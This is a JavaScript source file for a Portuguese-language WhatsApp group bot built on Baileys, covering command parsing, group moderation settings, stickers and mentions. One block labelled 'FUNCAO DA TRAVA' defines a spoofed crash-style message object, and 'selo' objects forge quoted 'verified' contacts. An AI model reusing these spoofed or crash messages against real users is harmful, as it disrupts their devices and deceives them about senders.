/*//ESSA BASE FOI CONSTRUÃDA, NO INTUITO DE OBTER A MELHOR PERFORMANCE DE SEUS BOT, NÃƒO UMA BASE PÃšBLICA ENTT NAO VAZEM E NEM VENDAM SEM A MINHA AUTORIZAÃ‡ÃƒO
 Â® COPYRIGHT BY GleysonDevs*/
const { downloadContentFromMessage, relayWAMessage, mentionedJid, processTime, MediaType, Browser, MessageType, Presence, Mimetype, Browsers, delay, getLastMessageInChat, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, logger, makeInMemoryStore, getContentType, INativeFlowMessage, prepareWAMessageMedia } = require('@whiskeysockets/baileys');

const { fs, Boom, axios, crypto, util, P, linkfy, request, cheerio, ms, ffmpeg, qrterminal, exec, spawn, execSync, moment, color, time, hora, date, getBuffer, convertSticker, recognize, fetchJson, fetchText, fetch, getBase64, createExif, writeExifImg, upload, nit, addBanned, unBanned, BannedExpired, cekBannedUser, validmove, setGame, addComandosId, deleteComandos, getComandoBlock, getComandos, addComandos, palavrasANA, quizanimais, garticArchives, whatMusicAr, enigmaArchive, quizFutebol, getpc, supre, wait, getExtension, generateMessageID, vyroEngine, getGroupAdmins, getMembros, emoji, sendPoll, getRandom, banner2, banner3, temporizador, chyt, kyun, TimeCount, simih, botoff, colors, os, arcloud, addFilter, isFiltered, ytdl, psycatgames, MultiDownload, AssemblyAI, obeso, countDays, timeDate, Limit_CMD, capitalizeFirstLetter, shuffle, pushnames, formatNumber, formatNumberDecimal, awaitMessage, listCommands, extractMetadata, extractDDD, extractStateFromNumber, extractStateFromDDD } = require('./yoko/configs/imports/consts.js');

const { linguagem, mess, getInfo, destrava, destrava2, tabela, namoro1, namoro2, tools, advices, ban, joguinhodavelhajs, joguinhodavelhajs2, nescessario, setting, logoslink, ftmenu, vip, rgtake, muted, countMessage, sendVideoAsSticker, sendImageAsSticker, sendVideoAsSticker2, sendImageAsSticker2, sotoy, daily, comandos, limitefll, antispam, anotar, enviarfiguUrl, getFileBuffer, DLT_FL, sleep, ANT_LTR_MD_EMJ, packname, getName, level2, chaves, grupos, aluguel } = require('./yoko/configs/imports/consts.js');

const config = JSON.parse(fs.readFileSync('./tst/config.json'));
const { Sticker } = require('./tst/plugins/sticker');
//const DL = require('./tst/plugins/dl').default;
//const Shazam = require("./tst/plugins/acrcloud.js");
//const KarloAI = require("./tst/plugins/karloai.js");

const { botoes, antipv, antipv2, antipv3, visualizarmsg, numero_dono1, numero_dono2, numero_dono3, numero_dono4, numero_dono5, numero_dono6, msgantipv1, msgantipv2, API_KEY_INVERTEXTO } = require("./yoko/configs/nescessario.json");

const { downloadAudio2, downloadAudio1} = require('./yoko/src/ytdl3.js');
const { NomeDoBot, ownerName, prefix } = require('./yoko/configs/settings.json');
const { Hercai } = require('hercai');
const herc = new Hercai();
const { API_URL, API_URL_GLEY, API_URL2, group, API_KEY_AKAME, API_KEY_GLEY, API_KEY_AKAME2 } = require('./yoko/configs/config-all.json');

//const { downloadVideo, downloadAudio, getVideoInfo, audioDir, videoDir } = require('./yoko/bunker/modulo_play/ytdl3')
console.log(colors.red(`YOKO V6 RECONHECEU TODAS AS CASES E ESTA FUNCIONANDO`))
const { audio_menu, bom_dia, boa_tarde, boa_noite, corno, qviado } = require('./yoko/configs/media/audios.json');

const { sendButton, sendListB } = require(`./yoko/bunker//funcoes/botoes.js`)

const { criarPagamentoPix, verificarPix } = require('./yoko/src/pix.js');
const { v4: uuidv4 } = require('uuid');

/*const API_KEY_BRONXYS = "OrbitalCloud"
const apitoken_api = 'KitagawaV8';
const site_orbitalV1 = 'http://localhost:3000';*/

//API DA YOKO BOT//
let YOKO_API = "https://zero-two.online"
let API_KEY_YOKO = "YOKO_BETA"

const MenuPrincipalImg = './yoko-img/menu.png';
const MenuPerfil = './yoko-img/perfil.png';

const revealmsg = JSON.parse(fs.readFileSync("./yoko/bunker/revealmsg.json"))
const FormData = require("form-data");
const { fundo1, fundolevel, fundo2, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, deathcmd, beijocmd, chutecmd, tapacmd, rnkgay, rnkgado, rnkcorno, rnkgostoso, rnkgostosa, rnknazista, rnkotaku, rnkpau, suruba, minado_bomb, thumbnail, imgsigma, imgbeta, imgbaiano, imgbaiana, imgcarioca, imglouco, imglouca, imgsafada, imgsafado, imgmacaco, imgmacaca, imgputa, rnksigma, rnkbeta, rnkbaiano, rnkbaiana, rnkcarioca, rnklouco, rnklouca, rnksafada, rnksafado, rnkmacaco, rnkmacaca, rnkputa } = require("./yoko/configs/links_img.json");

const II = "```";

const path = require('path');

var numerodono_ofc = setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "");

process.on('uncaughtException', function (err) {
console.error((new Date).toUTCString() + ' uncaughtException:', err.message);
console.error(err.stack);
});

const getallcases = () => {
  findindex = fs.readFileSync("yoko.js").toString().match(/case\s+'(.+?)'/g)
  cstt = []
  for(i of findindex) {
    cstt.push(i.split(`'`)[1])
  }
  return cstt
}

const allCases = getallcases();

const getSimilarity = require(`./yoko/src/similaridade.js`)

const rmLetras = (txt) => {
  return txt.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
}

const similarityCmd = (txt) => {
  getsmlrt = getSimilarity(allCases, txt)
  if(rmLetras(getsmlrt.nome).includes(`nao encontrado`)) return [{comando: getsmlrt.nome, porcentagem: getsmlrt.porcentagem}]
  return [{comando: prefix+getsmlrt.nome, porcentagem: Number(getsmlrt.porcentagem).toFixed(1)}]
}
// ABAIXO: INÃCIO DE CONEXÃƒO

async function startyoko() {

module.exports = yoko = async(upsert, yoko, qrcode) => {
async function startFunctionNaga() {
const nmrdn_dono2 = setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";

for (const info of upsert?.messages || []) {

const from = info.key.remoteJid;
const isGroup = from.endsWith('@g.us');
const isStatus = from.endsWith('@broadcast');

const VRF_JSON_GRUPO = fs.existsSync(`./yoko/bunker/database/grupos/activation_gp/${from}.json`) ? true : false;

if(VRF_JSON_GRUPO) {
var jsonGp = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/activation_gp/${from}.json`));
}

if(VRF_JSON_GRUPO && jsonGp[0].x9 && info.messageStubType){
    switch(info.messageStubType){
    case 29:
        await delay(1000);
        await yoko.sendMessage(info.key.remoteJid, {text: `*@${info.messageStubParameters[0].split("@")[0]}* foi promovido(a) ao cargo de adminstrador do grupo por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 50000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
    break
    
    case 30:
        await delay(1000);
        await yoko.sendMessage(info.key.remoteJid, {text: `O(a) adminstrador(a) *@${info.messageStubParameters[0].split("@")[0]}* foi rebaixado(a) Ã  membro comum por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 50000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
    break
  }
}
  
if(!info.message) return;
if(upsert.type == "append") return;  
const baileys = require('@whiskeysockets/baileys');
const type = baileys.getContentType(info.message);
const content = JSON.stringify(info.message);
const pushname = info.pushName ? info.pushName : '';

if(visualizarmsg) {
await yoko.readMessages([info.key]);
} else {
if(from == "status@broadcast") return;
}

global.prefix;
global.blocked;

//==============(BODY)================\\

var body = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || info.message?.buttonsResponseMessage?.selectedButtonId || info.message?.listResponseMessage?.singleSelectReply?.selectedRowId || info.message?.templateButtonReplyMessage?.selectedId || info?.text || info.message?.editedMessage?.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text || info.message?.editedMessage?.message?.protocolMessage?.editedMessage?.imageMessage?.caption || info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || info.message?.buttonsResponseMessage?.selectedButtonId || info.message?.listResponseMessage?.singleSelectReply?.selectedRowId || info.message?.templateButtonReplyMessage?.selectedId || JSON.parse(info.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}')?.id ||
           info?.text || '';

var Procurar_String = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || ""

const args = body.trim().split(/ +/).slice(1);

const budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/activation_gp/${from}.json`) && jsonGp[0].multiprefix) {
var prefix = jsonGp[0]?.prefixos[jsonGp[0]?.prefixos?.indexOf(String(body)?.trim()?.charAt(0))] || jsonGp[0].prefixos[0]
}

if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/activation_gp/${from}.json`) && !jsonGp[0].multiprefix) {var prefix = setting.prefix} else if(!isGroup) {var prefix = setting.prefix};

var isCmd = body.trim().startsWith(prefix);

const command = isCmd ? budy2.trim().slice(1).split(/ +/).shift().toLocaleLowerCase(): null;

const q_2 = budy2.trim().split(/ +/).slice(1).join(' ');

const q = args.join(' ');

var budy = (type === 'conversation') ? info.message?.conversation : (type === 'extendedTextMessage') ? info.message?.extendedTextMessage?.text : '';

var budy3 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

var PR_String = Procurar_String.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

const q_ofc = PR_String.trim().split(/ +/).slice(1).join(" ");

//======================================\\

try {var groupMetadata = isGroup ?  await yoko.groupMetadata(from): ""} catch {return}

const groupName = isGroup ? groupMetadata.subject : '';

const sender = isGroup ? info.key.participant.includes(':') ? info.key.participant.split(':')[0] +'@s.whatsapp.net': info.key.participant : info.key.remoteJid;

const messagesC = PR_String.slice(0).trim().split(/ +/).shift().toLowerCase();

const arg = body.substring(body.indexOf(' ') + 1);

const botNumber = await yoko.user.id.split(':')[0]+'@s.whatsapp.net';
const argss = body.split(/ +/g);
const testat = body;
const ants = body;

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const isnit = nit.includes(sender) 

const issupre = supre.includes(sender)

const ischyt = chyt.includes(sender)

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

const somembros = isGroup ? getMembros(groupMembers) : ''

//======================================\\

const nmrdn = setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` || isnit

const numerodono = [`${nmrdn}`, `${numero_dono1}@s.whatsapp.net`, `${numero_dono2}@s.whatsapp.net`, `${numero_dono3}@s.whatsapp.net`, `${numero_dono4}@s.whatsapp.net`, `${numero_dono5}@s.whatsapp.net`, `${numero_dono6}@s.whatsapp.net`]

//=====================================\\
//===============OPEN-CLOSE-GP==============\\
/*
const { openclosegp, saveOpenCloseGP, rgGroupOCfunc, getGroupOpenCloseFunc, addOpenCloseGP, rmOpenCloseGP, isIDopenCloseGP, ABRIR_E_FECHAR_GRUPO, getLastOpenCloseGP } = require("./yoko/bunker/abrir-fechar-grupo/index.js")
*/
//==================ADS-FUNC=================\\

const { ads, saveADS, addGroupInAds, getGroupAds, addAds, isIDads, rmAds, adsFunc, adsStartList, addAdminAds, getAdminAds, rmAdminAds, existAdminAds } = require("./yoko/bunker/mensagens programadas/ads system.js")

//==================HORÃRIOS=================\\
/*
const { paidHours, savePaid, addGroupInPaid, getGroupInPaid, getIDinPaid, addPaid, rmPaid, isIDinPaid, groupLinkPaid, paidSGL, addGroupLinkInPaid, getGroupLinkFromPaidID, getInfoPaidGroupLink, rmGroupLinkInPaid } = require("./yoko/bunker/horarios/paid hours.js")*/

//=================> FunÃ§Ãµes de Grupo ğŸ¥‹

const dirGroup = `./yoko/bunker/database/grupos/activation_gp/${from}.json`

const nescj = "./yoko/configs/nescessario.json"

if(isGroup && !fs.existsSync(dirGroup)){
var data = [{
    name: groupName,
    groupId: from, 
    x9: false, 
    antiimg: false, 
    antivideo: false,
    antiaudio: false, 
    antisticker: false,
    antidoc: false,
    antictt: false,
    antiloc: false, 
    antilinkgp: false,
    antilinkhard: false, 
    antilinkeasy: false, 
    antifake: false, 
    antiporn: false,
    Odelete: false, 
    antispam: false, 
    antinotas: false, 
    anticatalogo: false, 
    visuUnica: false, 
    registrarFIGUS: false, 
    soadm: false, 
    listanegra: [], 
    advertir: [], 
    prefixos: [`${setting.prefix}`],
    advertir2: [], 
    legenda_estrangeiro: "0",
    legenda_documento: "0", 
    legenda_video: "0",
    legenda_imagem: "0", 
    multiprefix: false, 
    ausentes: [], 
    ANTI_DDD: {
      active: false,
      listaProibidos: []
    },
    antipalavrao: {
        active: false,
        palavras: []
     },
     limitec: {
        active: false,
        quantidade: null
     },
    wellcome: [{
        bemvindo1: false,
        legendabv: "OlÃ¡ #numerodele#, seja bem vindo (a) ao grupo: #nomedogp#",
        legendasaiu: 0
      },
      {
        bemvindo2: false,
        legendabv: "OlÃ¡ #numerodele#, seja bem vindo (a) ao grupo: #nomedogp#",
        legendasaiu: 0
      }],
    simi1: false, 
    autosticker: false, 
    autoresposta: false,
    jogos: false, 
    level: false,
    bangp: false, 
    modo_rpg: false
}]
    fs.writeFileSync(dirGroup, JSON.stringify(data, null, 2) + '\n')
}

const dataGp = isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined 

var DFNMULTIP = `./yoko/bunker/database/func/prefixo/multip_${from}.json`

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + '\n')}

function setNes(index){
fs.writeFileSync(nescj, JSON.stringify(index, null, 2) + '\n')}

//=====(ADMS/DONO/ETC..CONST)=======\\

const adivinha = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'iPhone' : 'WhatsApp Web';

const quoted = info.quoted ? info.quoted : info

const isBot = info.key.fromMe ? true : false

const SoDono = numerodono.includes(sender) || isBot || isnit || issupre || ischyt

dfndofc = setting.ownerNumber+"@s.whatsapp.net"

const DonoOficial = dfndofc.includes(sender) 

const isVip = vip.map(i => i.id).includes(sender) || SoDono

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false || DonoOficial

const isListaBrancaG = nescessario.listabrancaG.includes(sender)

const isBanned = ban.includes(sender)

const isVisualizar = nescessario.visualizarmsg

const isVerificado = nescessario.verificado

const isWelcomePrivate = nescessario.welcomepv

const isAudioMenu = nescessario.menu_audio

const isAntiPv = nescessario.antipv 

const isAntiPv2 = nescessario.antipv2

const isAntiPv3 = nescessario.antipv3

const isBotoff = nescessario.botoff

const listanegraG = nescessario.listanegraG

const listabrancaG = nescessario.listabrancaG

const isAnticall = nescessario.anticall

const TOKEN_GPT = nescessario.TOKEN_GPT

const isCmdVip = nescessario.cmd_vip

const isBlockCmdG = nescessario.blockCmdG

const isButtons = nescessario.botoes

const isCargo = SoDono ? "Meu Mestre." : isGroupAdmins ? "Adminstrador.": "Membro Comum."

const isChVip = isVip ? "âœ“": "âœ•"

//============(FUNÃ‡Ã•ES)============\\

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false

const isAntiImg = isGroup ? dataGp[0].antiimg : undefined

const isLimitCmd = isGroup ? dataGp[0]?.Limitar_CMD : undefined

const isAntiVid = isGroup ? dataGp[0].antivideo : undefined

const isAntiAudio = isGroup ? dataGp[0].antiaudio : undefined

const isAntiSticker = isGroup ? dataGp[0].antisticker : undefined

const Antidoc = isGroup ? dataGp[0].antidoc : undefined

const isAntiCtt = isGroup ? dataGp[0].antictt : undefined

const Antiloc = isGroup ? dataGp[0].antiloc : undefined

const isAntiDDD = isGroup ? dataGp[0].ANTI_DDD.active : undefined

const isAntilinkgp = isGroup ? dataGp[0].antilinkgp : undefined

const isAntiLinkHard = isGroup ? dataGp[0].antilinkhard : undefined

const isAntiLinkEasy = isGroup ? dataGp[0].antilinkeasy : undefined

const isAntiPorn = isGroup ? dataGp[0].antiporn : undefined

const isAntifake = isGroup ? dataGp[0].antifake : undefined

const IS_DELETE = nescessario.Odelete

const So_Adm = isGroup ? dataGp[0].soadm : undefined

const isX9VisuUnica = isGroup ? dataGp[0].visuUnica : undefined

const ADVT = isGroup ? dataGp[0].advertir: undefined

const ADVT2 = isGroup ? dataGp[0].advertir2: undefined

const isx9 = isGroup ? dataGp[0].x9 : undefined

const isMultiP = isGroup ? dataGp[0].multiprefix : undefined

const isAntiNotas = isGroup ? dataGp[0].antinotas : undefined

const isAnticatalogo = isGroup ? dataGp[0].anticatalogo : undefined

const isWelkom = isGroup ? dataGp[0].wellcome[0].bemvindo1 : undefined

const isWelkom2 = isGroup ? dataGp[0].wellcome[1].bemvindo2 : undefined

const isSimi = isGroup ? dataGp[0].simi1 : undefined

const isAutofigu = isGroup ? dataGp[0].autosticker : undefined

const isAutorepo = isGroup ? dataGp[0].autoresposta : undefined

const isModobn =  isGroup ? dataGp[0].jogos : undefined

const isLevelingOn = isGroup ? dataGp[0].level : undefined

const isBanchat = isGroup ? dataGp[0].bangp : undefined

const isPalavrao = isGroup ? dataGp[0].antipalavrao.active : undefined

const isPalavras = isGroup ? dataGp[0].antipalavrao.palavras : undefined

const isAntiFlood = isGroup ? dataGp[0].limitec.active : undefined

const isLimitec = isGroup ? dataGp[0].limitec.quantidade : undefined

const isModoAluguel = nescessario.modo_aluguel

const isModoRPG = isGroup ? dataGp[0].modo_rpg : undefined

//============(VERIFICADOS)============\\

if(isVerificado) {
//verificado whatsapp
var selo = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ... {}}, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}}
//selo black
var seloblk = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ... {}}, message: {"contactMessage": {"displayName": `ğŸ‘‘ GleysonDevs DOMINA ğŸ‘‘`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;ğŸ‘‘ GleysonDevs DOMINA ğŸ‘‘,;;;\nFN:ğŸ‘‘ GleysonDevs DOMINA ğŸ‘‘,\nitem1.TEL;waid=${botNumber.split('@')[0]}:${botNumber.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
} else {
var seloctt = info
var seloblk = info
}

// FUNCAO DA TRAVA 

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `ğ˜ğ®ğ«ğ¢ ğŒğ¨ğğ³ ğŸ•Šï¸`
}
}
}

// FUNÃ‡Ã•ES DE MARCAÃ‡Ã•ES ESSENCIAL \\

const menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const menc_jid2 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid

const sender_ou_n = q.includes("@") ? menc_jid : sender

const mrc_ou_numero = q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_os2 = q.includes("@") ? menc_jid : menc_prt 

const marc_tds = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 

const menc_prt_nmr = q.length > 12 ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt

////////////////////////////////////////////


var isUrl = (url) => {
if(linkfy.find(url)[0]) return true
return false
}

//
const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss');

if(time2 > "00:00:00" && time2 < "05:00:00"){
    var tempo = 'Boa noite'
    var tempo2 = 'ğğ¨ğš ğ§ğ¨ğ¢ğ­ğ'
} if(time2 > "05:00:00" && time2 < "12:00:00"){
    var tempo = 'Bom dia'
    var tempo2 = 'ğğ¨ğ¦ ğğ¢ğš'
} if(time2 > "12:00:00" && time2 < "18:00:00"){
    var tempo = 'Boa tarde'
    var tempo2 = 'ğğ¨ğš ğ­ğšğ«ğğ'
} if(time2 > "18:00:00"){
    var tempo = 'Boa noite'
    var tempo2 = 'ğğ¨ğš ğ§ğ¨ğ¢ğ­ğ'
}

if(!isCmd && info.key.fromMe) return

const reply = (texto) => {
yoko.sendMessage(from, { text: texto, /*contextInfo: {
forwardingScore: 100000, isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: "120363298695038212@newsletter", newsletterName: 'AYANOKOJI V1 MD'}
}, */
mentions: [menc_os2],
mentions: [sender]
},{quoted: selo});
}

async function sendUrlText(id, textCaption, title, desc, imageUrl, linkAcess, quotedThis) {
  await yoko.sendMessage(id, {text: textCaption, contextInfo: {externalAdReply: {title: title, body: desc, thumbnail: await getBuffer(imageUrl), mediaType: 1, sourceUrl: linkAcess}}}, {quoted: quotedThis})
}
  
async function replyWithNewsletter(text, options = {}, quotedThis = info) {
await yoko.sendMessage(from, {text: text, contextInfo: options}, {quoted: quotedThis})
.catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a mensagem prÃ©-definida na funÃ§Ã£o.'}, {quoted: selo});
});
}

async function replyWithReaction(text, options = {}, quotedThis = info) {
await yoko.sendMessage(from, options)
await yoko.sendMessage(from, {text: text}, {quoted: quotedThis})
.catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a mensagem prÃ©-definida na funÃ§Ã£o.'}, {quoted: selo});
});
}

const sendSticker = async(ChatID, FileN, quotedThis) => {
await yoko.sendMessage(ChatID, {sticker: {url: FileN}}, {quoted: selo})
.catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao enviar o sticker.'}, {quoted: selo});
});
}

const sendImage = async(ChatID, FileN) => {
await yoko.sendMessage(ChatID, {image: {url: FileN}}, {quoted: selo}).catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao enviar a imagem.'}, {quoted: selo});
})
}

const sendText = async(ChatID, texto) => {
await yoko.sendMessage(ChatID, {text: texto}).catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar o texto prÃ©-definido na funÃ§Ã£o.'}, {quoted: selo});
});
}

const sendMentions = async(local, teks) => {
memberr = []; vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy) {for(zn of vz.split(' ')) {if(zn.includes('@')) memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')}};
await yoko.sendMessage(local, {text: teks.trim(), mentions: memberr}, {quoted: selo}).catch(async(e) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a mensagem prÃ©-definida na funÃ§Ã£o.'}, {quoted: selo});
});
}

const mentions = async(teks = '', mb, id) => {
(id == null || id == undefined || id == false) ? await yoko.sendMessage(from, {text: teks.trim(), mentions: mb}) : await yoko.sendMessage(from, {text: teks.trim(), mentions: mb}, {quoted: selo})
}
	
const mention = async(teks = '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy) { 
for(zn of vz.split(' ')) {
if(zn.includes('@')) memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}
}
await yoko.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}).catch(async(e) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a mensagem prÃ©-definida na funÃ§Ã£o.'}, {quoted: selo});
});
}

const mentionSemQuoted = async(teks) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@')) memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
await yoko.sendMessage(from, {text: teks.trim(), mentions: memberr}).catch(async(e) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a mensagem prÃ©-definida na funÃ§Ã£o.'}, {quoted: selo});
});
}


const mencionarIMG = async(teks = '', FileN, thisQuoted = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy) { 
for(zn of vz.split(' ')) {
if(zn.includes('@')) memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net');
}
}
await yoko.sendMessage(from, {image: {url: FileN}, caption: teks.trim(), mentions: memberr}, {quoted: thisQuoted}).catch(async(error) => {
await yoko.sendMessage(from, {text: 'Ocorreu um erro ao encaminhar a imagem e o texto prÃ©-definidos na funÃ§Ã£o.'}, {quoted: selo});
});
}

const reagir = async (idgp, emj) => {
await yoko.sendMessage(idgp, {react: {text: emj, key: info.key}});
}

const verificarN = async(sla) => {
const [result] = await yoko.onWhatsApp(sla)
if(result == undefined) {
reply("Este usuÃ¡rio nÃ£o Ã© existente no WhatsApp")
} else {
reply(`${sla} NÃºmero inserido Ã© existente no WhatsApp com o id: ${result.jid}`)
}
}

if(isGroup && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.key.fromMe) {
if(menc_jid2?.length >= groupMembers.length - 1) { 
await yoko.sendMessage(from, {text: mess.markingAllMember()}, {quoted: selo});
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, {delete: {remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
yoko.groupParticipantsUpdate(from, [sender], "remove");
}
}

if(isAutofigu && isGroup) {
async function autofiguf() {
setTimeout(async() => {    
if(budy.includes(`${prefix}sticker`) || budy.includes(`${prefix}s`) || budy.includes(`${prefix}stk`) || budy.includes(`${prefix}st`) || budy.includes(`${prefix}fsticker`) || budy.includes(`${prefix}f`) || budy.includes(`${prefix}fstiker`)) return
if(type == 'imageMessage') {
var pack = `â†§ âªğŸ¤–à¸ºà£ªà£­Í˜ê•¸â–¸ ğ‚ğ«ğ¢ğšğğš ğ©ğ¨ğ«:\nâ€¢ â†³ ${NomeDoBot}\nâ€”\nâ†§ âªğŸ•µğŸ»â€â™‚ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğğ«ğ¨ğ©ğ«ğ¢ğğ­ğšğ«ğ¢ğ¨:\nâ€¢ â†³ ${ownerName}`
var author2 = `â†§ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ ğ’ğ¨ğ¥ğ¢ğœğ¢ğ­ğšğğ¨ ğ©ğ¨ğ«:\nâ€¢ â†³ ${pushname}\nâ€”\nâ†§ âªâ˜ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğ†ğ«ğ®ğ©ğ¨:\nâ€¢ â†³ ${groupName}`
owgi = await getFileBuffer(info.message.imageMessage, 'image')
let encmediaa = await sendImageAsSticker2(yoko, from, owgi, selo, { packname:pack, author:author2})
DLT_FL(encmediaa)
}
if(type == 'videoMessage') {
if((isMedia && info.message.videoMessage.seconds < 10)) {
var pack = `â†§ âªğŸ¤–à¸ºà£ªà£­Í˜ê•¸â–¸ ğ‚ğ«ğ¢ğšğğš ğ©ğ¨ğ«:\nâ€¢ â†³ ${NomeDoBot}\nâ€”\nâ†§ âªğŸ•µğŸ»â€â™‚ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğğ«ğ¨ğ©ğ«ğ¢ğğ­ğšğ«ğ¢ğ¨:\nâ€¢ â†³ ${ownerName}`
var author2 = `â†§ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ ğ’ğ¨ğ¥ğ¢ğœğ¢ğ­ğšğğ¨ ğ©ğ¨ğ«:\nâ€¢ â†³ ${pushname}\nâ€”\nâ†§ âªâ˜ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğ†ğ«ğ®ğ©ğ¨:\nâ€¢ â†³ ${groupName}`
owgi = await getFileBuffer(info.message.videoMessage, 'video')
let encmedia = await sendVideoAsSticker2(yoko, from, owgi, selo, { packname:pack, author:author2})
DLT_FL(encmedia)
}
} 
}, 1000)
}
autofiguf().catch((error) => {
console.log(error)
})
}

var nmrdnofc1 = setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "")

if(isGroup && fs.existsSync(`./yoko/bunker/database/func/afk/afk-@${nmrdnofc1}.json`)) {
if(budy.indexOf(`@${nmrdnofc1}`) >= 0) {
const tabelin = JSON.parse(fs.readFileSync(`./yoko/bunker/database/func/afk/afk-@${nmrdnofc1}.json`));  
await yoko.sendMessage(from, {text: mess.absenceRecordOwner(ownerName, tabelin)}, {quoted: selo})
}
}

